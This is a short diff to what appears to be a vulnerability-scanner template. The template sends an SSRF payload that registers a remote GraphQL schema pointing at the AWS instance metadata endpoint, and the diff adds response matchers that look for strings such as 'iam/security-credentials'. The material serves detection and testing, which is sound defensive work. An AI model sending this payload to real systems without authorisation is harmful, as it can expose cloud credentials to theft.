@@ -57,7 +57,8 @@
           "payload": "{\"type\":\"add_remote_schema\",\"args\":{\"name\":\"swk-ssrf\",\"definition\":{\"url\":\"http://169.254.169.254/latest/meta-data/\",\"timeout_seconds\":2}}}",
           "description": "Register remote schema pointing at AWS IMDS. Subsequent introspect call returns metadata response.",
           "matchers": [
-            {"type": "status", "status": [200], "condition": "and"}
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "word", "words": ["ami-id", "instance-id", "iam/security-credentials", "meta-data", "instance-identity"], "condition": "and"}
           ],
           "severity": "critical",
           "confidence_boost": 85,
